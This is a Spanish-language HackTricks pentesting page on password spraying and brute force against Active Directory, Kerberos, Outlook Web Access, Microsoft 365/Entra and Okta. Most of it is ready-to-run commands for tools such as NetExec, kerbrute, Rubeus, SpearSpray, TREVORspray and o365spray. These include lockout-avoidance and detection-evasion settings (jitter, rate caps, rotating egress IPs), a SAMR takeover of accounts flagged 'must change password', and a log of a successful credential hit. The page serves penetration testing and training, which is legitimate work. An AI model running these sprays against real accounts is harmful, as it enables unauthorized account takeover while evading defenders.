# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Una vez que hayas encontrado varios **nombres de usuario válidos**, puedes probar las **contraseñas más comunes** (ten en cuenta la política de contraseñas del entorno) con cada uno de los usuarios descubiertos.\
De forma **predeterminada**, la **longitud** **mínima** de la **contraseña** es de **7**.

Las listas de nombres de usuario comunes también pueden ser útiles: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Ten en cuenta que **podrías bloquear algunas cuentas si pruebas varias contraseñas incorrectas** (de forma predeterminada, más de 10).

### Obtener la política de contraseñas

Si tienes credenciales de usuario o una shell como usuario del dominio, puedes **obtener la política de contraseñas con**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Explotación desde Linux (o todos)

- Usando **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Usando **NetExec (CME successor)** para realizar spraying dirigido y de bajo ruido a través de SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Usando [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(puedes indicar el número de intentos para evitar bloqueos):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NO RECOMENDADO, A VECES NO FUNCIONA<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Con el módulo `scanner/smb/smb_login` de **Metasploit**:

![Password Spraying - Brute-Force: Con el módulo scanner/smb/smb login de Metasploit](<../../images/image (745).png>)

- Usando **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Desde Windows

- Con [Rubeus](https://github.com/Zer1t0/Rubeus) versión con módulo brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Puede generar usuarios del dominio de forma predeterminada y obtener la política de contraseñas del dominio y limitar los intentos de acuerdo con ella):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Con [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identificar y tomar el control de cuentas con "Password must change at next logon" (SAMR)

Una técnica de bajo ruido consiste en hacer password spraying con una contraseña benigna/vacía y detectar las cuentas que devuelven STATUS_PASSWORD_MUST_CHANGE, lo que indica que la contraseña caducó forzosamente y puede cambiarse sin conocer la anterior.<sup>[[9]](#references)[[10]](#references)</sup>

Flujo de trabajo:
- Enumerar usuarios (RID brute mediante SAMR) para crear la lista de objetivos:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Realiza password spraying con una contraseña vacía y continúa con los hits para capturar cuentas que deben cambiar la contraseña en el siguiente inicio de sesión:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Para cada coincidencia, cambia la contraseña mediante SAMR con el módulo de NetExec (no se necesita la contraseña anterior cuando se establece "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Notas operativas:
- Asegúrate de que el reloj de tu host esté sincronizado con el DC antes de realizar operaciones basadas en Kerberos: `sudo ntpdate <dc_fqdn>`.
- Un [+] sin (Pwn3d!) en algunos módulos (p. ej., RDP/WinRM) significa que las credenciales son válidas, pero la cuenta no tiene derechos de inicio de sesión interactivo.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Spraying de pre-autenticación de Kerberos con targeting mediante LDAP y throttling consciente de PSO (SpearSpray)

El spraying basado en pre-autenticación de Kerberos reduce el ruido frente a los intentos de SMB/NTLM/LDAP bind y se ajusta mejor a las políticas de bloqueo de AD. SpearSpray combina targeting basado en LDAP, un motor de patrones y conocimiento de las políticas (política del dominio + PSO + buffer de `badPwdCount`) para realizar spraying de forma precisa y segura. También puede etiquetar principals comprometidos en Neo4j para el pathing de BloodHound.<sup>[[1]](#references)</sup>

Ideas clave:
- Descubrimiento de usuarios mediante LDAP con paginación y soporte para LDAPS, usando opcionalmente filtros LDAP personalizados.
- Filtrado basado en la política de bloqueo del dominio y consciente de PSO para dejar un buffer de intentos configurable (threshold) y evitar bloquear usuarios.
- Validación de pre-autenticación de Kerberos mediante fast gssapi bindings (genera 4768/4771 en los DC en lugar de 4625).
- Generación de contraseñas basada en patrones y específica para cada usuario, usando variables como nombres y valores temporales derivados del `pwdLastSet` de cada usuario.
- Control del throughput mediante threads, jitter y un máximo de requests por segundo.
- Integración opcional con Neo4j para marcar usuarios owned para BloodHound.

Uso básico y descubrimiento:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Selección de objetivos y control de patrones:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Controles de sigilo y seguridad:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Enriquecimiento de Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Resumen del sistema de patrones (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Notas operativas:

- Prioriza las consultas al PDC-emulator con -dc para leer el badPwdCount más autorizado y la información relacionada con las políticas.
- Los restablecimientos de badPwdCount se activan en el siguiente intento después de la ventana de observación; utiliza el umbral y el tiempo para mantenerte seguro.
- Los intentos de pre-authentication de Kerberos aparecen como 4768/4771 en la telemetría del DC; utiliza jitter y rate-limiting para mezclarlos con el tráfico normal.

> Consejo: el tamaño de página LDAP predeterminado de SpearSpray es 200; ajústalo con -lps según sea necesario.

## Outlook Web Access

Hay varias herramientas para **password spraying en Outlook**.

- Con [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- con [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Con [Ruler](https://github.com/sensepost/ruler) (¡fiable!)<sup>[[5]](#references)</sup>
- Con [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Con [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Para utilizar cualquiera de estas herramientas, necesitas una lista de usuarios y una contraseña o una lista pequeña de contraseñas para hacer spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Para el spraying en la nube, primero identifica si el tenant es **managed**, **federated** o **hybrid**, porque el endpoint y el comportamiento del lockout pueden diferir de los de AD local. En Microsoft Entra, **Smart Lockout** cambia cómo los intentos repetidos consumen el presupuesto de lockout:<sup>[[7]](#references)</sup>

- Repetir la **misma contraseña incorrecta** no sigue incrementando el contador de lockout, pero probar **candidatos nuevos** sí lo hace.
- Las ubicaciones **conocidas** y **desconocidas** tienen contadores **independientes**.
- Los tenants que utilizan **pass-through authentication (PTA)** no se benefician del seguimiento de hashes de contraseñas incorrectas, así que trátalos más como objetivos clásicos sensibles al lockout.

En la práctica, haz spraying de **una contraseña por ronda**, deja suficiente separación entre rondas y prefiere herramientas que puedan descubrir el flujo de autenticación real del tenant antes de enviar los intentos.

- Con [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORSpray), puedes hacer recon del tenant, descubrir el `token_endpoint`, hacer spraying contra `msol`/`adfs`/`owa`/`okta` y rotar el tráfico mediante varias IPs de salida:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Con [**Spray365**](https://github.com/MarkoH17/Spray365), puedes crear previamente un **plan de ejecución** reanudable, aleatorizar el orden de autenticación y aplicar un **retraso mínimo por usuario** para mantenerte fuera de la ventana de bloqueo:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Con [**o365spray**](https://github.com/0xZDH/o365spray), puedes validar el tenant, enumerar usuarios con módulos como `onedrive` y hacer spray mediante `oauth2` o `adfs`, manteniendo **un intento por usuario** durante cada ventana de bloqueo. Si ya tienes una API de FireProx, pásala con `--proxy-url` para distribuir las IPs de origen:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
El tradecraft reciente de los operadores también ha avanzado hacia el **spraying distribuido en la nube**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) admite ventanas de tiempo, mezcla de contraseñas, spraying en ADFS/M365 y exfiltración post-auth automática. Los abusos recientes en el mundo real también utilizaron la enumeración de cuentas mediante la **Microsoft Teams API** y la rotación de regiones de **AWS** para distribuir las oleadas de spraying entre varias geografías de origen.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referencias

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
